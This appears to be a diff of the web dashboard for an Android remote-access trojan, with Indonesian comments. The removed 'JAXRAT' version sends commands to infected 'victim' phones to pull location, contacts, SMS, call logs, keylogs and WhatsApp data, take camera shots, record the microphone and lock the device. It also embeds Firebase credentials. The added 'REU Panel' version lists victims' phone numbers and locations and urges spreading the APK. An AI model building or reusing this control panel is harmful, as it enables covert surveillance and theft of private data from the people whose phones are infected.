@@ -1,396 +1,85 @@
+<!-- PATH: /dashboard.html -->
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JAXRAT - Dashboard</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background: #0a0a14; color: #fff; }
-        .navbar { background: rgba(20, 20, 30, 0.95); backdrop-filter: blur(10px); padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2a2a3a; position: sticky; top: 0; z-index: 100; }
-        .logo { font-size: 1.5rem; font-weight: 700; }
-        .logo span { color: #8a5cf6; }
-        .nav-links { display: flex; gap: 1.5rem; align-items: center; }
-        .nav-links a { color: #a0a0c0; text-decoration: none; font-size: 0.95rem; transition: color 0.3s; cursor: pointer; }
-        .nav-links a:hover, .nav-links a.active { color: #8a5cf6; }
-        .user-badge { background: #2a2a3a; padding: 0.4rem 1rem; border-radius: 50px; font-size: 0.85rem; display: flex; align-items: center; gap: 0.5rem; }
-        .user-badge i { color: #8a5cf6; }
-        .main-container { display: flex; }
-        .sidebar { width: 280px; background: #12121e; min-height: calc(100vh - 64px); border-right: 1px solid #2a2a3a; padding: 1.5rem; overflow-y: auto; }
-        .victim-header { font-size: 0.8rem; color: #606080; letter-spacing: 1px; margin-bottom: 1rem; display: flex; justify-content: space-between; }
-        .victim-item { background: #1a1a28; border-radius: 12px; padding: 1rem; margin-bottom: 0.8rem; border: 1px solid #2a2a3a; transition: all 0.3s; cursor: pointer; }
-        .victim-item:hover, .victim-item.active { border-color: #8a5cf6; background: #222233; }
-        .victim-name { font-weight: 600; margin-bottom: 0.3rem; }
-        .victim-detail { font-size: 0.75rem; color: #8080a0; display: flex; gap: 0.5rem; }
-        .victim-status { width: 8px; height: 8px; border-radius: 50%; background: #4caf50; display: inline-block; margin-right: 0.5rem; }
-        .content { flex: 1; padding: 2rem; }
-        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1.5rem; margin-bottom: 2rem; }
-        .stat-card { background: #12121e; border-radius: 16px; padding: 1.5rem; border: 1px solid #2a2a3a; }
-        .stat-value { font-size: 2rem; font-weight: 700; color: #8a5cf6; }
-        .stat-label { color: #8080a0; margin-top: 0.3rem; font-size: 0.9rem; }
-        .section-title { font-size: 1.2rem; margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.5rem; }
-        .card { background: #12121e; border-radius: 16px; border: 1px solid #2a2a3a; padding: 1.5rem; margin-bottom: 2rem; }
-        table { width: 100%; border-collapse: collapse; }
-        th { text-align: left; padding: 1rem 0.5rem; color: #8080a0; font-weight: 500; font-size: 0.85rem; border-bottom: 1px solid #2a2a3a; }
-        td { padding: 0.8rem 0.5rem; border-bottom: 1px solid #1e1e2a; }
-        .badge { background: #2a2a3a; padding: 0.2rem 0.8rem; border-radius: 50px; font-size: 0.75rem; width: fit-content; }
-        .profile-container { max-width: 500px; }
-        .info-row { display: flex; justify-content: space-between; padding: 1rem; background: #1a1a28; border-radius: 12px; margin-bottom: 1rem; border: 1px solid #2a2a3a; }
-        .info-label { color: #8080a0; }
-        .info-value { font-family: monospace; background: #0a0a14; padding: 0.3rem 0.8rem; border-radius: 8px; display: inline-block; }
-        .copy-btn { background: #2a2a3a; border: none; color: white; padding: 0.3rem 1rem; border-radius: 8px; margin-left: 0.5rem; cursor: pointer; }
-        .copy-btn:hover { background: #8a5cf6; }
-    </style>
-</head>
-<body>
-    <div class="navbar">
-        <div class="logo">JAX<span>RAT</span> PANEL</div>
-        <div class="nav-links">
-            <a class="active" onclick="showSection('dashboard')">Dashboard</a>
-            <a onclick="showSection('victims')">Victims</a>
-            <a onclick="showSection('commands')">Commands</a>
-            <a onclick="showSection('profile')">Profile</a>
-            <a onclick="logout()">Logout</a>
-        </div>
-        <div class="user-badge">
-            <i>👤</i> <span id="userEmail">-</span>
-        </div>
-    </div>
-    
-    <div class="main-container">
-        <div class="sidebar">
-            <div class="victim-header">
-                <span>ONLINE DEVICES</span>
-                <span id="victimCount">0</span>
-            </div>
-            <div id="victimList">
-                <!-- Victim list akan di-load via JS -->
-                <div style="color: #606080; text-align: center; padding: 2rem;">Loading victims...</div>
-            </div>
-        </div>
-        
-        <div class="content" id="mainContent">
-            <!-- Dashboard Section (default) -->
-            <div id="section-dashboard">
-                <div class="stats-grid">
-                    <div class="stat-card">
-                        <div class="stat-value" id="totalVictims">0</div>
-                        <div class="stat-label">Total Victims</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value" id="onlineNow">0</div>
-                        <div class="stat-label">Online Now</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value" id="todayNew">0</div>
-                        <div class="stat-label">New Today</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value" id="totalCommands">0</div>
-                        <div class="stat-label">Commands Sent</div>
-                    </div>
-                </div>
-                
-                <h2 class="section-title">📍 LIVE LOCATIONS</h2>
-                <div class="card" id="locationMap" style="height: 300px; display: flex; align-items: center; justify-content: center; background: #1a1a28;">
-                    <span style="color: #606080;">Loading map integration...</span>
-                    <!-- Lo bisa integrasi Leaflet maps nanti -->
-                </div>
-                
-                <h2 class="section-title">🔔 RECENT NOTIFICATIONS</h2>
-                <div class="card">
-                    <table id="recentNotifTable">
-                        <thead>
-                            <tr><th>App</th><th>Title</th><th>Time</th></tr>
-                        </thead>
-                        <tbody>
-                            <tr><td colspan="3" style="text-align: center; color: #606080;">Select victim to see notifications</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-            
-            <!-- Victims Section (hidden by default) -->
-            <div id="section-victims" style="display: none;">
-                <h2 class="section-title">👥 ALL VICTIMS</h2>
-                <div class="card">
-                    <table>
-                        <thead>
-                            <tr><th>Device</th><th>Phone</th><th>Country</th><th>Last Seen</th><th>Actions</th></tr>
-                        </thead>
-                        <tbody id="victimsTableBody">
-                            <tr><td colspan="5" style="text-align: center;">Loading...</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-            
-            <!-- Commands Section -->
-            <div id="section-commands" style="display: none;">
-                <h2 class="section-title">⚙️ COMMAND CENTER</h2>
-                <div class="card">
-                    <p style="color: #8080a0; margin-bottom: 1rem;">Send command to selected victim: <span id="selectedVictimCmd">None</span></p>
-                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem;">
-                        <button onclick="sendCommand('location')">📍 Get Location</button>
-                        <button onclick="sendCommand('contacts')">👥 Get Contacts</button>
-                        <button onclick="sendCommand('sms')">💬 Get SMS</button>
-                        <button onclick="sendCommand('calls')">📞 Get Call Logs</button>
-                        <button onclick="sendCommand('notifications')">🔔 Get Notif</button>
-                        <button onclick="sendCommand('camera_front')">📸 Camera Front</button>
-                        <button onclick="sendCommand('camera_back')">📷 Camera Back</button>
-                        <button onclick="sendCommand('mic')">🎤 Record Mic</button>
-                        <button onclick="sendCommand('lock')">🔒 Lock Device</button>
-                        <button onclick="sendCommand('files')">📁 List Files</button>
-                        <button onclick="sendCommand('keylog')">⌨️ Get Keylogs</button>
-                        <button onclick="sendCommand('whatsapp')">💬 WhatsApp</button>
-                    </div>
-                    <div style="margin-top: 2rem;">
-                        <h3>Command Output</h3>
-                        <pre id="cmdOutput" style="background: #0a0a14; padding: 1rem; border-radius: 8px; max-height: 200px; overflow: auto;">-</pre>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Profile Section -->
-            <div id="section-profile" style="display: none;">
-                <h2 class="section-title">👤 PROFILE</h2>
-                <div class="card profile-container">
-                    <div class="info-row">
-                        <span class="info-label">Email</span>
-                        <div><span class="info-value" id="profileEmail">-</span></div>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Password</span>
-                        <div>
-                            <span class="info-value" id="profilePass">-</span>
-                            <button class="copy-btn" onclick="copyToClipboard('profilePass')">Copy</button>
-                        </div>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Firebase UID</span>
-                        <div>
-                            <span class="info-value" id="profileUid">-</span>
-                            <button class="copy-btn" onclick="copyToClipboard('profileUid')">Copy</button>
-                        </div>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Owner UID</span>
-                        <div>
-                            <span class="info-value" id="ownerUid">-</span>
-                            <button class="copy-btn" onclick="copyToClipboard('ownerUid')">Copy</button>
-                        </div>
-                    </div>
-                    <p style="color: #8080a0; font-size: 0.85rem; margin-top: 1rem;">UID ini yang harus lo masukkin ke app.json victim sebagai "userid"</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
+    <title>Dashboard - REU Panel</title>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="navbar">
+        <h2>REU Panel</h2>
+        <div>
+            <a href="dashboard.html">Dashboard</a>
+            <a href="profile.html">Profile</a>
+            <button onclick="logout()">Logout</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <h1>Selamat Datang, <span id="user-email">Loading...</span></h1>
+        <p>UID Kamu: <strong><span id="user-uid"></span></strong> <button onclick="copyUID()">Copy UID</button></p>
+        <p><i>UID ini yang bakal lo masukin ke file `app.json` di asset aplikasi victim nanti.</i></p>
+
+        <hr>
+
+        <h2>📱 Data Korban (Victims)</h2>
+        <div id="victims-list">Loading data korban...</div>
+    </div>
+
+    <script src="firebase-config.js"></script>
     <script>
-        // Firebase Config (sama kayak di login)
-        const firebaseConfig = {
-            apiKey: "AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ",
-            authDomain: "jaxrat-6813c.firebaseapp.com",
-            databaseURL: "https://jaxrat-6813c-default-rtdb.firebaseio.com",
-            projectId: "jaxrat-6813c",
-            storageBucket: "jaxrat-6813c.firebasestorage.app",
-            messagingSenderId: "750985295231",
-            appId: "1:750985295231:web:0679d4b998e52256e4d64a"
-        };
-
-        firebase.initializeApp(firebaseConfig);
-        const auth = firebase.auth();
-        const db = firebase.database();
-
-        let currentUser = null;
-        let ownerUid = null;
-        let selectedVictimId = null;
-        let victimsData = {};
-
-        // Cek session
-        const token = sessionStorage.getItem('token');
-        const uid = sessionStorage.getItem('uid');
-        const email = sessionStorage.getItem('email');
-        const encodedPass = sessionStorage.getItem('password');
-        
-        if (!token || !uid) {
-            window.location.href = 'index.html';
-        }
-
-        document.getElementById('userEmail').textContent = email || '-';
-        document.getElementById('profileEmail').textContent = email || '-';
-        if (encodedPass) {
-            document.getElementById('profilePass').textContent = atob(encodedPass);
-        }
-        document.getElementById('profileUid').textContent = uid;
-
-        // Auth state
+        // Cek status login
         auth.onAuthStateChanged(user => {
-            if (user) {
-                currentUser = user;
-                loadOwnerUid();
-                loadVictims();
+            if (!user) {
+                window.location.href = 'index.html'; // Balik ke login kalo ga login
             } else {
-                window.location.href = 'index.html';
+                document.getElementById('user-email').innerText = user.email;
+                document.getElementById('user-uid').innerText = user.uid;
+                loadVictims(user.uid);
             }
         });
 
-        function loadOwnerUid() {
-            db.ref('settings/owner_uid').once('value').then(snap => {
-                ownerUid = snap.val();
-                document.getElementById('ownerUid').textContent = ownerUid || '-';
-            });
-        }
-
-        function loadVictims() {
-            if (!currentUser) return;
-            
-            const isOwner = (ownerUid === currentUser.uid);
-            let victimsRef;
-            
-            if (isOwner) {
-                victimsRef = db.ref('victims');
-            } else {
-                victimsRef = db.ref(`victims/${currentUser.uid}`);
-            }
-            
-            victimsRef.on('value', snap => {
-                const data = snap.val();
-                victimsData = data || {};
-                
-                // Update counts
-                const total = Object.keys(victimsData).length;
-                document.getElementById('totalVictims').textContent = total;
-                document.getElementById('victimCount').textContent = total;
-                
-                // Update victim list di sidebar
-                renderVictimList();
-                
-                // Update victims table
-                renderVictimsTable();
-            });
-        }
-
-        function renderVictimList() {
-            const listEl = document.getElementById('victimList');
-            if (Object.keys(victimsData).length === 0) {
-                listEl.innerHTML = '<div style="color: #606080; text-align: center; padding: 2rem;">No victims yet</div>';
-                return;
-            }
-            
-            let html = '';
-            Object.keys(victimsData).forEach(deviceId => {
-                const victim = victimsData[deviceId] || {};
-                html += `
-                    <div class="victim-item ${selectedVictimId === deviceId ? 'active' : ''}" onclick="selectVictim('${deviceId}')">
-                        <div class="victim-name">
-                            <span class="victim-status" style="background: ${victim.online ? '#4caf50' : '#808080'}"></span>
-                            ${victim.deviceName || 'Unknown Device'}
-                        </div>
-                        <div class="victim-detail">
-                            <span>${victim.phone || 'No SIM'}</span> • 
-                            <span>${victim.country || '??'}</span>
-                        </div>
-                    </div>
-                `;
-            });
-            listEl.innerHTML = html;
-        }
-
-        function renderVictimsTable() {
-            const tbody = document.getElementById('victimsTableBody');
-            if (Object.keys(victimsData).length === 0) {
-                tbody.innerHTML = '<tr><td colspan="5" style="text-align: center;">No victims found</td></tr>';
-                return;
-            }
-            
-            let html = '';
-            Object.keys(victimsData).forEach(deviceId => {
-                const v = victimsData[deviceId] || {};
-                html += `
-                    <tr>
-                        <td>${v.deviceName || 'Unknown'}<br><small style="color:#606080;">${v.model || ''}</small></td>
-                        <td>${v.phone || '-'}</td>
-                        <td>${v.country || '-'}</td>
-                        <td>${v.lastSeen ? new Date(v.lastSeen).toLocaleString() : '-'}</td>
-                        <td><button class="badge" onclick="selectVictim('${deviceId}'); showSection('commands')">Manage</button></td>
-                    </tr>
-                `;
-            });
-            tbody.innerHTML = html;
-        }
-
-        window.selectVictim = function(deviceId) {
-            selectedVictimId = deviceId;
-            renderVictimList(); // Refresh highlight
-            document.getElementById('selectedVictimCmd').textContent = deviceId;
-            loadVictimData(deviceId);
-        };
-
-        function loadVictimData(deviceId) {
-            // Load recent notifications
-            db.ref(`devices/${deviceId}/notifications`).limitToLast(5).once('value', snap => {
-                const notifs = snap.val();
-                const tbody = document.querySelector('#recentNotifTable tbody');
-                if (!notifs) {
-                    tbody.innerHTML = '<tr><td colspan="3" style="text-align: center;">No notifications</td></tr>';
-                    return;
-                }
-                
-                let html = '';
-                Object.values(notifs).reverse().forEach(n => {
-                    html += `<tr><td>${n.app || 'Unknown'}</td><td>${n.title || ''}</td><td>${n.time ? new Date(n.time).toLocaleTimeString() : ''}</td></tr>`;
-                });
-                tbody.innerHTML = html;
-            });
-        }
-
-        window.sendCommand = function(cmdType) {
-            if (!selectedVictimId) {
-                alert('Pilih victim dulu bang!');
-                return;
-            }
-            
-            const cmdRef = db.ref(`commands/${selectedVictimId}`).push();
-            cmdRef.set({
-                type: cmdType,
-                timestamp: firebase.database.ServerValue.TIMESTAMP,
-                status: 'pending'
-            }).then(() => {
-                document.getElementById('cmdOutput').textContent = `Command ${cmdType} sent to ${selectedVictimId}`;
-            });
-        };
-
-        window.showSection = function(section) {
-            // Hide all
-            document.getElementById('section-dashboard').style.display = 'none';
-            document.getElementById('section-victims').style.display = 'none';
-            document.getElementById('section-commands').style.display = 'none';
-            document.getElementById('section-profile').style.display = 'none';
-            
-            // Show selected
-            document.getElementById(`section-${section}`).style.display = 'block';
-            
-            // Update nav active
-            document.querySelectorAll('.nav-links a').forEach(el => el.classList.remove('active'));
-            event.target.classList.add('active');
-        };
-
-        window.copyToClipboard = function(elementId) {
-            const text = document.getElementById(elementId).textContent;
-            navigator.clipboard.writeText(text);
-            alert('Copied!');
-        };
-
-        window.logout = function() {
+        function logout() {
             auth.signOut().then(() => {
-                sessionStorage.clear();
                 window.location.href = 'index.html';
             });
-        };
+        }
+
+        function copyUID() {
+            const uid = document.getElementById('user-uid').innerText;
+            navigator.clipboard.writeText(uid);
+            alert('UID berhasil dicopy: ' + uid);
+        }
+
+        function loadVictims(uid) {
+            // Path di database: /victims/{uid attacker}/
+            const victimsRef = database.ref('victims/' + uid);
+            victimsRef.on('value', (snapshot) => {
+                const data = snapshot.val();
+                const container = document.getElementById('victims-list');
+                if (!data) {
+                    container.innerHTML = '<p>Belum ada korban. Sebar APK dulu, bro!</p>';
+                    return;
+                }
+
+                let html = '<table border="1" cellpadding="5"><tr><th>Device ID</th><th>Nama Device</th><th>Nomor HP</th><th>Lokasi Terakhir</th><th>Action</th></tr>';
+                for (let deviceId in data) {
+                    const victim = data[deviceId];
+                    html += `<tr>
+                        <td>${deviceId}</td>
+                        <td>${victim.deviceName || 'N/A'}</td>
+                        <td>${victim.phoneNumber || 'N/A'}</td>
+                        <td>${victim.lastLocation || 'N/A'}</td>
+                        <td><button onclick="alert('Fitur detail menyusul!')">Detail</button></td>
+                    </tr>`;
+                }
+                html += '</table>';
+                container.innerHTML = html;
+            });
+        }
     </script>
 </body>
 </html>
